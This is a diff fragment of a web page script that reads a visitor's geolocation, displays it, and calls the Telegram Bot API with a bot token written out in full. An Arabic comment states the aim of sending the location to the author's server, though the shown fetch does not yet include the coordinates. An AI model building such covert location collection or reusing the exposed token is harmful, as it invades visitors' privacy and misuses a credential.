@@ -16,7 +16,7 @@
           const lon = position.coords.longitude;
           document.getElementById("result").innerText = `Latitude: ${lat}, Longitude: ${lon}`;
           // إرسال الموقع إلى سيرفرك
-          fetch(`https://api.telegram.org/bot<7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ>/getWebhookInfo`)
+          fetch(`https://api.telegram.org/bot<7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ>`)
             .then(response => response.text())
             .then(data => console.log("تم الإرسال:", data));
         }, () => {
